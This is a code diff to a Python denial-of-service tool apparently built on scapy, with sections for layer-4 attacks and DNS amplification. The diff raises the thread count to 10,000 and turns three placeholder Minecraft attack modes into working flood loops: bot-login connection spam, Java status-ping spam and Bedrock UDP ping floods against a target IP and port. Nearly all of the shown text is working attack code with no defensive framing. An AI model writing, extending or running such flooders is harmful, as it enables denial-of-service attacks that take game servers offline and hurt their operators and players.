@@ -11,11 +11,12 @@ from scapy.all import *
 from scapy.layers.inet import IP, ICMP, TCP, UDP
 from scapy.layers.dns import DNS, DNSQR
 from colorama import Fore, Style, init
+from mcstatus import JavaServer
 
 init(autoreset=True)
 
-MAX_THREADS = 3000
-MAX_PROCESSES = 600
+MAX_THREADS = 10000
+MAX_PROCESSES = 100
 
 # --- Basic L4 Attacks ---
 def random_ip():
@@ -215,16 +216,46 @@ def dns_amp(ip, port, duration):
 # --- Minecraft Modes (placeholder) ---
 
 def mcbot(ip, port, duration):
-    print("[!] MCBOT attack - To be implemented.")
-    time.sleep(duration)
+    print("[*] Starting Minecraft bot spam...")
+    timeout = time.time() + duration
+    while time.time() < timeout:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(2)
+            s.connect((ip, port))
+            fake_name = f"Bot{random.randint(1000,9999)}"
+            packet = (
+                b"\x00" 
+                + bytes([len(fake_name)]) + fake_name.encode()
+            )
+            s.sendall(packet)
+            s.close()
+        except:
+            continue
 
 def mcstatus(ip, port, duration):
-    print("[!] Minecraft status ping - Placeholder.")
-    time.sleep(duration)
+    print("[*] Spamming Minecraft Java Edition server status pings...")
+    timeout = time.time() + duration
+    while time.time() < timeout:
+        try:
+            server = JavaServer(ip, port)
+            server.status()  
+        except:
+            continue
 
 def mcpe_status(ip, port, duration):
-    print("[!] Minecraft PE status ping - Placeholder.")
-    time.sleep(duration)
+    print("[*] Spamming Minecraft Bedrock Edition server status pings...")
+    timeout = time.time() + duration
+    message = b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+    while time.time() < timeout:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(message, (ip, port))
+            s.settimeout(1)
+            s.recvfrom(2048)
+            s.close()
+        except:
+            continue
 
 # --- PROXY LOADER ---
 
